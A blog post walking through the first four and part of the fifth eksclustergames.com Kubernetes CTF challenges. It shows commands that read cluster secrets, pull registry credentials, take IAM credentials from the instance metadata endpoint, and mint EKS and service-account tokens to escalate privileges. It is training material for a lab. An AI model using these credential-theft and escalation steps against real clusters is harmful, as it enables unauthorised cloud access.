<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width"/><meta charSet="utf-8"/><link rel="alternate" type="application/rss+xml" title="sontek&#x27;s Engineering Blog" href="/rss.xml"/><title>eksclustergames.com walk through!</title><meta name="next-head-count" content="4"/><link rel="preload" href="/_next/static/css/4e645f88d9d5f47b.css" as="style"/><link rel="stylesheet" href="/_next/static/css/4e645f88d9d5f47b.css" data-n-g=""/><link rel="preload" href="/_next/static/css/95e79f6f6f52c645.css" as="style"/><link rel="stylesheet" href="/_next/static/css/95e79f6f6f52c645.css" data-n-p=""/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-5cd94c89d3acac5f.js"></script><script src="/_next/static/chunks/webpack-d7b038a63b619762.js" defer=""></script><script src="/_next/static/chunks/framework-4556c45dd113b893.js" defer=""></script><script src="/_next/static/chunks/main-2a9c662ddd7329fb.js" defer=""></script><script src="/_next/static/chunks/pages/_app-2e2b8b955a26d1f2.js" defer=""></script><script src="/_next/static/chunks/996-9e3c12b77542c098.js" defer=""></script><script src="/_next/static/chunks/771-5e4a02ed896d5599.js" defer=""></script><script src="/_next/static/chunks/pages/blog/%5B...id%5D-426e76fedd45ec38.js" defer=""></script><script src="/_next/static/R-uEYyZyL75EZxUttNLHg/_buildManifest.js" defer=""></script><script src="/_next/static/R-uEYyZyL75EZxUttNLHg/_ssgManifest.js" defer=""></script><script src="/_next/static/R-uEYyZyL75EZxUttNLHg/_middlewareManifest.js" defer=""></script></head><body><div id="__next"><div><div class="grid"><div class="col"><header id="banner" class="body"><h1><a href="/">sontek.net</a></h1></header></div><div class="col menu"><nav><ul><li><a href="/">Home</a></li><li><a href="/blog">Blog</a></li><li><a href="/resume">Resume</a></li><li><a href="/about">About</a></li></ul></nav></div></div><div class="container"><article class="blog_article__NoEy4"><h1 class="util_headingXl__knZ_h">eksclustergames.com walk through!</h1><div class="util_lightText__xcqUE"><time dateTime="2023-11-02T00:00:00Z">November 2, 2023</time></div><div><p><a href="https://eksclustergames.com">eksclustergames.com</a> is a new CTF targetted at
kubernetes vulnerabilities. This is a walk through on how to solve the issues.</p>
<h1>Challenge 1</h1>
<p>The first challenge starts off with a clue:</p>
<pre><code class="hljs language-csharp">Jumpstart your quest <span class="hljs-keyword">by</span> listing all the secrets <span class="hljs-keyword">in</span> the cluster.
Can you spot the flag among them?
</code></pre>
<p>So lets start off by getting the secrets:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get secret </span>
NAME         TYPE     DATA   AGE
log-rotate   Opaque   1      37h
</code></pre>
<p>Since there is only one, lets view it!</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get secret -o json</span>
{
    <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
    <span class="hljs-string">"items"</span>: [
        {
            <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
            <span class="hljs-string">"data"</span>: {
                <span class="hljs-string">"flag"</span>: <span class="hljs-string">"d2l6X2Vrc19jaGFsbGVuZ2V7b21nX292ZXJfcHJpdmlsZWdlZF9zZWNyZXRfYWNjZXNzfQ=="</span>
            },
            <span class="hljs-string">"kind"</span>: <span class="hljs-string">"Secret"</span>,
            <span class="hljs-string">"metadata"</span>: {
                <span class="hljs-string">"creationTimestamp"</span>: <span class="hljs-string">"2023-11-01T13:02:08Z"</span>,
                <span class="hljs-string">"name"</span>: <span class="hljs-string">"log-rotate"</span>,
                <span class="hljs-string">"namespace"</span>: <span class="hljs-string">"challenge1"</span>,
                <span class="hljs-string">"resourceVersion"</span>: <span class="hljs-string">"890951"</span>,
                <span class="hljs-string">"uid"</span>: <span class="hljs-string">"03f6372c-b728-4c5b-ad28-70d5af8d387c"</span>
            },
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"Opaque"</span>
        }
    ],
    <span class="hljs-string">"kind"</span>: <span class="hljs-string">"List"</span>,
    <span class="hljs-string">"metadata"</span>: {
        <span class="hljs-string">"resourceVersion"</span>: <span class="hljs-string">""</span>
    }
}
</code></pre>
<p>The flag seems to be in <code>.items[0].data.flag</code> and is <code>base64</code> encoded so we can
decode it as well:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get secret -o json|jq '.items[0].data.flag' -r | base64 -d</span>
wiz_eks_challenge{omg_over_privileged_*REDACTED*}
</code></pre>
<p>First flag found!</p>
<p>This one was definitely a softball but it gets you nice and warmed up on the
platform.</p>
<h1>Challenge 2</h1>
<p>The hint for this challenge is:</p>
<pre><code class="hljs language-csharp">A thing we learned during our research: always check the container registries.

For your convenience, the crane utility <span class="hljs-keyword">is</span> already pre-installed <span class="hljs-keyword">on</span> the machine.
</code></pre>
<p>The first thing I think of when reading this is that it has something to do
with the registry a pod is living on.   So lets list the pods and see what is
available:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod</span>
NAME                    READY   STATUS    RESTARTS   AGE
database-pod-2c9b3a4e   1/1     Running   0          36h
</code></pre>
<p>With only one pod as a target, lets get the image for it:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod -o json |jq '.items[0].spec.containers[0].image'</span>
<span class="hljs-string">"eksclustergames/base_ext_image"</span>
</code></pre>
<p>So its on standard <code>docker.io</code> registry instead of a private one like I was
expecting from the clue.   The second hint was that crane is on the system so
lets use that to pull the image and inspect it:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># crane config eksclustergames/base_ext_image          </span>
Error: fetching config: reading image <span class="hljs-string">"eksclustergames/base_ext_image"</span>: GET https://index.docker.io/v2/eksclustergames/base_ext_image/manifests/latest: UNAUTHORIZED: authentication required; [map[Action:pull Class: Name:eksclustergames/base_ext_image Type:repository]]
</code></pre>
<p>Which means this is a private image and we are going to need to get some
credentials to an account that has access to this image. Usually you have to
define a secret for kubernetes to be able to pull from private registries and
since we started off with a secret test first that is where I'm going to go
next:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod -o json |jq '.items[0].spec.imagePullSecrets'</span>
[
  {
    <span class="hljs-string">"name"</span>: <span class="hljs-string">"registry-pull-secrets-780bab1d"</span>
  }
]
</code></pre>
<p>So that is the secret we need, lets view it:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get secret registry-pull-secrets-780bab1d -o json |jq '.data.".dockerconfigjson"' -r|base64 -d|jq</span>
{
  <span class="hljs-string">"auths"</span>: {
    <span class="hljs-string">"index.docker.io/v1/"</span>: {
      <span class="hljs-string">"auth"</span>: <span class="hljs-string">"ZWtzY2x1c3RlcmdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZUWo4RnVDbw=="</span>
    }
  }
}
</code></pre>
<p>Looks like we've got some more base64 decoding for the actual auth credentials:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># echo "ZWtzY2x1c3RdhbWVzOmRj&#x3C;*REDACTED*>200bHI0NWlZ4RnVDbw==" | base64 -d</span>
eksclustergames:dckr&#x3C;*REDACTED*>
</code></pre>
<p>So now we can login with <code>crane auth</code>:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># crane auth login -u eksclustergames -p dckr&#x3C;*REDACTED*> docker.io</span>
2023/11/03 02:35:49 logged <span class="hljs-keyword">in</span> via /home/user/.docker/config.json
</code></pre>
<p>So if we try to view the image again it should work!</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># crane config eksclustergames/base_ext_image|jq</span>
{
  <span class="hljs-string">"architecture"</span>: <span class="hljs-string">"amd64"</span>,
  <span class="hljs-string">"config"</span>: {
    <span class="hljs-string">"Env"</span>: [
      <span class="hljs-string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
    ],
    <span class="hljs-string">"Cmd"</span>: [
      <span class="hljs-string">"/bin/sleep"</span>,
      <span class="hljs-string">"3133337"</span>
    ],
    <span class="hljs-string">"ArgsEscaped"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-string">"OnBuild"</span>: null
  },
  <span class="hljs-string">"created"</span>: <span class="hljs-string">"2023-11-01T13:32:18.920734382Z"</span>,
  <span class="hljs-string">"history"</span>: [
    {
      <span class="hljs-string">"created"</span>: <span class="hljs-string">"2023-07-18T23:19:33.538571854Z"</span>,
      <span class="hljs-string">"created_by"</span>: <span class="hljs-string">"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "</span>
    },
    {
      <span class="hljs-string">"created"</span>: <span class="hljs-string">"2023-07-18T23:19:33.655005962Z"</span>,
      <span class="hljs-string">"created_by"</span>: <span class="hljs-string">"/bin/sh -c #(nop)  CMD [\"sh\"]"</span>,
      <span class="hljs-string">"empty_layer"</span>: <span class="hljs-literal">true</span>
    },
    {
      <span class="hljs-string">"created"</span>: <span class="hljs-string">"2023-11-01T13:32:18.920734382Z"</span>,
      <span class="hljs-string">"created_by"</span>: <span class="hljs-string">"RUN sh -c echo 'wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}' > /flag.txt # buildkit"</span>,
      <span class="hljs-string">"comment"</span>: <span class="hljs-string">"buildkit.dockerfile.v0"</span>
    },
    {
      <span class="hljs-string">"created"</span>: <span class="hljs-string">"2023-11-01T13:32:18.920734382Z"</span>,
      <span class="hljs-string">"created_by"</span>: <span class="hljs-string">"CMD [\"/bin/sleep\" \"3133337\"]"</span>,
      <span class="hljs-string">"comment"</span>: <span class="hljs-string">"buildkit.dockerfile.v0"</span>,
      <span class="hljs-string">"empty_layer"</span>: <span class="hljs-literal">true</span>
    }
  ],
  <span class="hljs-string">"os"</span>: <span class="hljs-string">"linux"</span>,
  <span class="hljs-string">"rootfs"</span>: {
    <span class="hljs-string">"type"</span>: <span class="hljs-string">"layers"</span>,
    <span class="hljs-string">"diff_ids"</span>: [
      <span class="hljs-string">"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f"</span>,
      <span class="hljs-string">"sha256:a70cef1cb742e242b33cc21f949af6dc7e59b6ea3ce595c61c179c3be0e5d432"</span>
    ]
  }
}
</code></pre>
<p>Looks like they leaked the secret right there in the image layers:</p>
<pre><code class="hljs language-vbnet">wiz_eks_challenge{nothing_can_be_said_to_*REDACTED*}<span class="hljs-comment">'</span>
</code></pre>
<p>So lets submit that and move onto the next one!</p>
<h1>Challenge 3</h1>
<p>The hint is:</p>
<pre><code class="hljs language-vbnet">A pod<span class="hljs-comment">'s image holds more than just code. Dive deep into its ECR repository,</span>
inspect the image layers, <span class="hljs-built_in">and</span> uncover the hidden secret.

<span class="hljs-symbol">Remember:</span> You are running inside a compromised EKS pod.
</code></pre>
<p>This sounds very similar to the last one but with the hints that its on ECR and
that we are in the pod itself it makes me believe we'll have something like IRSA
access to AWS from the pod and need to use that to get to it.</p>
<p>First lets check what pods we are working with:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod</span>
NAME                      READY   STATUS    RESTARTS   AGE
accounting-pod-876647f8   1/1     Running   0          37h
</code></pre>
<p>So same as the last challenge, lets get the image and see what access we have:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod -o json |jq '.items[0].spec.containers[0].image'</span>
<span class="hljs-string">"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01"</span>
</code></pre>
<p>Which as expected, we do not have access to:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01</span>
Error: fetching config: reading image <span class="hljs-string">"688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01"</span>: GET https://688655246681.dkr.ecr.us-west-1.amazonaws.com/v2/central_repo-aaf4a7c/manifests/sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01: unexpected status code 401 Unauthorized: Not Authorized
</code></pre>
<p>Since I expect the pod already has AWS access, lets check if the AWS CLI works:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts get-caller-identity</span>

Unable to locate credentials. You can configure credentials by running <span class="hljs-string">"aws configure"</span>.
</code></pre>
<p>Credentials are not configured right now, so we need to discover them.  Lets
check if we have metadata server access:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># curl http://169.254.169.254/latest/meta-data/iam</span>
info
security-credentials/
</code></pre>
<p>We do!  So we should be able to pull the credentials out of there to get access
to AWS:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># curl -sS http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-challenge-cluster-nodegroup-NodeInstanceRole|jq</span>
{
  <span class="hljs-string">"AccessKeyId"</span>: <span class="hljs-string">"ASIA2AVYNE&#x3C;*REDACTED*>"</span>,
  <span class="hljs-string">"Expiration"</span>: <span class="hljs-string">"2023-11-03 03:50:19+00:00"</span>,
  <span class="hljs-string">"SecretAccessKey"</span>: <span class="hljs-string">"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*"</span>,
  <span class="hljs-string">"SessionToken"</span>: <span class="hljs-string">"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>"</span>
}
</code></pre>
<p>Lets set those as environment variables to activate our AWS access:</p>
<pre><code class="hljs language-bash"><span class="hljs-built_in">export</span> AWS_ACCESS_KEY_ID=<span class="hljs-string">"ASIA2AVYNE&#x3C;*REDACTED*"</span>
<span class="hljs-built_in">export</span> AWS_SECRET_ACCESS_KEY=<span class="hljs-string">"e4TuLKKPBAVvyPkhKiJG0jO0&#x3C;*REDACTED*"</span>
<span class="hljs-built_in">export</span> AWS_SESSION_TOKEN=<span class="hljs-string">"FwoGZXIvYXdzEBQaDAM9SyNaDBowmWoT1SK3AbqDZUQpyn&#x3C;*REDACTED*>"</span>

root@wiz-eks-challenge:~<span class="hljs-comment"># aws sts get-caller-identity</span>
{
    <span class="hljs-string">"UserId"</span>: <span class="hljs-string">"ASIA2AVYNE&#x3C;*REDACTED*>:i-0cb922c6673973282"</span>,
    <span class="hljs-string">"Account"</span>: <span class="hljs-string">"688655246681"</span>,
    <span class="hljs-string">"Arn"</span>: <span class="hljs-string">"arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282"</span>
}
</code></pre>
<p>Now we should be able to authenticate crane and inspect the image from ECR:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># export PASSWORD=$(aws ecr get-login-password)</span>
root@wiz-eks-challenge:~<span class="hljs-comment"># crane auth login -u AWS -p $PASSWORD 688655246681.dkr.ecr.us-west-1.amazonaws.com  </span>
2023/11/03 02:56:41 logged <span class="hljs-keyword">in</span> via /home/user/.docker/config.json
</code></pre>
<p>Lets get those layers!</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># crane config 688655246681.dkr.ecr.us-west-1.amazonaws.com/central_repo-aaf4a7c@sha256:7486d05d33ecb1c6e1c796d59f63a336cfa8f54a3cbc5abf162f533508dd8b01|jq</span>
{
  <span class="hljs-string">"architecture"</span>: <span class="hljs-string">"amd64"</span>,
  <span class="hljs-string">"config"</span>: {
    <span class="hljs-string">"Env"</span>: [
      <span class="hljs-string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>
    ],
    <span class="hljs-string">"Cmd"</span>: [
      <span class="hljs-string">"/bin/sleep"</span>,
      <span class="hljs-string">"3133337"</span>
    ],
    <span class="hljs-string">"ArgsEscaped"</span>: <span class="hljs-literal">true</span>,
    <span class="hljs-string">"OnBuild"</span>: null
  },
  <span class="hljs-string">"created"</span>: <span class="hljs-string">"2023-11-01T13:32:07.782534085Z"</span>,
  <span class="hljs-string">"history"</span>: [
    {
      <span class="hljs-string">"created"</span>: <span class="hljs-string">"2023-07-18T23:19:33.538571854Z"</span>,
      <span class="hljs-string">"created_by"</span>: <span class="hljs-string">"/bin/sh -c #(nop) ADD file:7e9002edaafd4e4579b65c8f0aaabde1aeb7fd3f8d95579f7fd3443cef785fd1 in / "</span>
    },
    {
      <span class="hljs-string">"created"</span>: <span class="hljs-string">"2023-07-18T23:19:33.655005962Z"</span>,
      <span class="hljs-string">"created_by"</span>: <span class="hljs-string">"/bin/sh -c #(nop)  CMD [\"sh\"]"</span>,
      <span class="hljs-string">"empty_layer"</span>: <span class="hljs-literal">true</span>
    },
    {
      <span class="hljs-string">"created"</span>: <span class="hljs-string">"2023-11-01T13:32:07.782534085Z"</span>,
      <span class="hljs-string">"created_by"</span>: <span class="hljs-string">"RUN sh -c #ARTIFACTORY_USERNAME=challenge@eksclustergames.com ARTIFACTORY_TOKEN=wiz_eks_challenge{the_history_of_container_images_could_reveal&#x3C;*REDACTED*>} ARTIFACTORY_REPO=base_repo /bin/sh -c pip install setuptools --index-url intrepo.eksclustergames.com # buildkit # buildkit"</span>,
      <span class="hljs-string">"comment"</span>: <span class="hljs-string">"buildkit.dockerfile.v0"</span>
    },
    {
      <span class="hljs-string">"created"</span>: <span class="hljs-string">"2023-11-01T13:32:07.782534085Z"</span>,
      <span class="hljs-string">"created_by"</span>: <span class="hljs-string">"CMD [\"/bin/sleep\" \"3133337\"]"</span>,
      <span class="hljs-string">"comment"</span>: <span class="hljs-string">"buildkit.dockerfile.v0"</span>,
      <span class="hljs-string">"empty_layer"</span>: <span class="hljs-literal">true</span>
    }
  ],
  <span class="hljs-string">"os"</span>: <span class="hljs-string">"linux"</span>,
  <span class="hljs-string">"rootfs"</span>: {
    <span class="hljs-string">"type"</span>: <span class="hljs-string">"layers"</span>,
    <span class="hljs-string">"diff_ids"</span>: [
      <span class="hljs-string">"sha256:3d24ee258efc3bfe4066a1a9fb83febf6dc0b1548dfe896161533668281c9f4f"</span>,
      <span class="hljs-string">"sha256:9057b2e37673dc3d5c78e0c3c5c39d5d0a4cf5b47663a4f50f5c6d56d8fd6ad5"</span>
    ]
  }
}
</code></pre>
<p>Looks like they made the same mistake again and leaked the secret in the image
layers!</p>
<pre><code class="hljs language-markdown">wiz<span class="hljs-emphasis">_eks_</span>challenge{the<span class="hljs-emphasis">_history_</span>of<span class="hljs-emphasis">_container_</span>images<span class="hljs-emphasis">_could_</span>reveal&#x3C;<span class="hljs-emphasis">*REDACTED*</span>>} 
</code></pre>
<p>Time for challenge 4!</p>
<h1>Challenge 4</h1>
<p>The hint:</p>
<pre><code class="hljs language-python">Yo<span class="hljs-string">u're inside a vulnerable pod on an EKS cluster. Your pod'</span>s service-account has
no permissions. Can you navigate your way to access the EKS Node<span class="hljs-string">'s privileged
service-account?
</span></code></pre>
<p>This sounds like we're going to need to escalate our privileges through the AWS
access we acquired in the last challenge. Lets start with inspecting the
environment again:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl get pod</span>
Error from server (Forbidden): pods is forbidden: User <span class="hljs-string">"system:serviceaccount:challenge4:service-account-challenge4"</span> cannot list resource <span class="hljs-string">"pods"</span> <span class="hljs-keyword">in</span> API group <span class="hljs-string">""</span> <span class="hljs-keyword">in</span> the namespace <span class="hljs-string">"challenge4"</span>
</code></pre>
<p>So we don't even have access to list pods!   Do we have any access?</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl auth can-i --list</span>
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                     Resource Names     Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
                                                [/.well-known/openid-configuration]   []                 [get]
                                                [/api/*]                              []                 [get]
                                                [/api]                                []                 [get]
                                                [/apis/*]                             []                 [get]
                                                [/apis]                               []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/livez]                              []                 [get]
                                                [/livez]                              []                 [get]
                                                [/openapi/*]                          []                 [get]
                                                [/openapi]                            []                 [get]
                                                [/openid/v1/jwks]                     []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version]                            []                 [get]
                                                [/version]                            []                 [get]
podsecuritypolicies.policy                      []                                    [eks.privileged]   [use]
</code></pre>
<p>That is <em>very</em> minimal access. So we are going to have to try get a token using
the escalated privileges.  Usually we could use <code>aws eks get-token</code> but that
requires knowing the cluster name and I don't know that.   Lets try to list the
clusters:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws eks list-clusters</span>

An error occurred (AccessDeniedException) when calling the ListClusters operation: User: arn:aws:sts::688655246681:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/i-0cb922c6673973282 is not authorized to perform: eks:ListClusters on resource: arn:aws:eks:us-west-1:688655246681:cluster/*
</code></pre>
<p>So they haven't given us much to go on at all here.  The role itself <em>might</em> be
a clue but that is relying on them being consistent with their naming:</p>
<pre><code class="hljs language-ruby"><span class="hljs-symbol">arn:</span><span class="hljs-symbol">aws:</span>sts::<span class="hljs-number">688655246681</span><span class="hljs-symbol">:assumed-role/eks-challenge-cluster-nodegroup-NodeInstanceRole/</span>
</code></pre>
<p>The cluster name <em>might</em> be <code>eks-challenge-cluster</code> based on that but I can't
guarantee that. Lets check its security groups:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># curl -sS http://169.254.169.254/latest/meta-data/security-groups;echo</span>
eks-cluster-sg-eks-challenge-cluster-963543728
</code></pre>
<p>The name is there again.  I don't feel good about not having more details but it
is at least worth trying it:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws eks get-token --cluster-name eks-challenge-cluster</span>
{
    <span class="hljs-string">"kind"</span>: <span class="hljs-string">"ExecCredential"</span>,
    <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"client.authentication.k8s.io/v1beta1"</span>,
    <span class="hljs-string">"spec"</span>: {},
    <span class="hljs-string">"status"</span>: {
        <span class="hljs-string">"expirationTimestamp"</span>: <span class="hljs-string">"2023-11-03T03:38:10Z"</span>,
        <span class="hljs-string">"token"</span>: <span class="hljs-string">"k8s-aws-v1.aHR0cHM6Ly9zdHMudXMtd2VzdC0xLmFtYX&#x3C;*REDACTED*"</span>
    }
}
</code></pre>
<p>This gets us a token, so lets try to use it:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># export TOKEN=$(aws eks get-token --cluster-name eks-challenge-cluster|jq '.status.token' -r)</span>
root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl --token "$TOKEN" auth can-i --list</span>
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
                                                [/api/*]            []                 [get]
                                                [/api]              []                 [get]
                                                [/apis/*]           []                 [get]
                                                [/apis]             []                 [get]
                                                [/healthz]          []                 [get]
                                                [/healthz]          []                 [get]
                                                [/livez]            []                 [get]
                                                [/livez]            []                 [get]
                                                [/openapi/*]        []                 [get]
                                                [/openapi]          []                 [get]
                                                [/readyz]           []                 [get]
                                                [/readyz]           []                 [get]
                                                [/version/]         []                 [get]
                                                [/version/]         []                 [get]
                                                [/version]          []                 [get]
                                                [/version]          []                 [get]
podsecuritypolicies.policy                      []                  [eks.privileged]   [use]
</code></pre>
<p>Perfect!  We have more access which includes fetching secrets:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl --token "$TOKEN" get secret -o json</span>
{
    <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
    <span class="hljs-string">"items"</span>: [
        {
            <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
            <span class="hljs-string">"data"</span>: {
                <span class="hljs-string">"flag"</span>: <span class="hljs-string">"d2l6X2Vrc19jaGFsbGVuZ2V7b25seV9hX3&#x3C;*REDACTED*>="</span>
            },
            <span class="hljs-string">"kind"</span>: <span class="hljs-string">"Secret"</span>,
            <span class="hljs-string">"metadata"</span>: {
                <span class="hljs-string">"creationTimestamp"</span>: <span class="hljs-string">"2023-11-01T12:27:57Z"</span>,
                <span class="hljs-string">"name"</span>: <span class="hljs-string">"node-flag"</span>,
                <span class="hljs-string">"namespace"</span>: <span class="hljs-string">"challenge4"</span>,
                <span class="hljs-string">"resourceVersion"</span>: <span class="hljs-string">"883574"</span>,
                <span class="hljs-string">"uid"</span>: <span class="hljs-string">"26461a29-ec72-40e1-adc7-99128ce664f7"</span>
            },
            <span class="hljs-string">"type"</span>: <span class="hljs-string">"Opaque"</span>
        }
    ],
    <span class="hljs-string">"kind"</span>: <span class="hljs-string">"List"</span>,
    <span class="hljs-string">"metadata"</span>: {
        <span class="hljs-string">"resourceVersion"</span>: <span class="hljs-string">""</span>
    }
}
</code></pre>
<p>So we just need to base64 decode that and we are on to the next challenge!</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl --token "$TOKEN" get secret -o json | jq '.items[0].data.flag' -r|base64 -d</span>
wiz_eks_challenge{only_a_real_pro_can_navigate_&#x3C;*REDACTED*>}
</code></pre>
<h1>Challenge 5</h1>
<p>The hint:</p>
<pre><code class="hljs language-vbnet">You<span class="hljs-comment">'ve successfully transitioned from a limited Service Account to a Node</span>
Service Account! Great job. Your <span class="hljs-keyword">next</span> challenge <span class="hljs-built_in">is</span> <span class="hljs-keyword">to</span> move <span class="hljs-keyword">from</span> the EKS <span class="hljs-keyword">to</span> the
AWS account.

Can you acquire the AWS role <span class="hljs-keyword">of</span> the s3access-sa service account, <span class="hljs-built_in">and</span> <span class="hljs-keyword">get</span> the flag?
</code></pre>
<p>So lets start with checking what access we do have:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl whoami </span>
system:node:challenge:ip-192-168-21-50.us-west-1.compute.internal
</code></pre>
<p>Can we list buckets?</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># aws s3 ls</span>

An error occurred (AccessDenied) when calling the ListBuckets operation: Access Denied
</code></pre>
<p>Nope!  So we need to figure out how to become the <code>s3access-sa</code>. What access do
we have?</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl auth can-i --list</span>
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs   Resource Names     Verbs
serviceaccounts/token                           []                  [debug-sa]         [create]
selfsubjectaccessreviews.authorization.k8s.io   []                  []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                  []                 [create]
pods                                            []                  []                 [get list]
secrets                                         []                  []                 [get list]
serviceaccounts                                 []                  []                 [get list]
                                                [/api/*]            []                 [get]
                                                [/api]              []                 [get]
                                                [/apis/*]           []                 [get]
                                                [/apis]             []                 [get]
                                                [/healthz]          []                 [get]
                                                [/healthz]          []                 [get]
                                                [/livez]            []                 [get]
                                                [/livez]            []                 [get]
                                                [/openapi/*]        []                 [get]
                                                [/openapi]          []                 [get]
                                                [/readyz]           []                 [get]
                                                [/readyz]           []                 [get]
                                                [/version/]         []                 [get]
                                                [/version/]         []                 [get]
                                                [/version]          []                 [get]
                                                [/version]          []                 [get]
podsecuritypolicies.policy                      []                  [eks.privileged]   [use]
</code></pre>
<p>Hmm, being able to create tokens for the <code>debug-sa</code> resource definitely seems
suspicious. So lets see if that will get us anywhere:</p>
<pre><code class="hljs language-bash">root@wiz-eks-challenge:~<span class="hljs-comment"># export TOKEN=$(kubectl create token debug-sa)</span>
root@wiz-eks-challenge:~<span class="hljs-comment"># kubectl --token $TOKEN auth can-i --list</span>
warning: the list may be incomplete: webhook authorizer does not support user rule resolution
Resources                                       Non-Resource URLs                     Resource Names     Verbs
selfsubjectaccessreviews.authorization.k8s.io   []                                    []                 [create]
selfsubjectrulesreviews.authorization.k8s.io    []                                    []                 [create]
                                                [/.well-known/openid-configuration]   []                 [get]
                                                [/api/*]                              []                 [get]
                                                [/api]                                []                 [get]
                                                [/apis/*]                             []                 [get]
                                                [/apis]                               []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/healthz]                            []                 [get]
                                                [/livez]                              []                 [get]
                                                [/livez]                              []                 [get]
                                                [/openapi/*]                          []                 [get]
                                                [/openapi]                            []                 [get]
                                                [/openid/v1/jwks]                     []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/readyz]                             []                 [get]
                                                [/version/]                           []                 [get]
                                                [/version/]                           []                 [get]
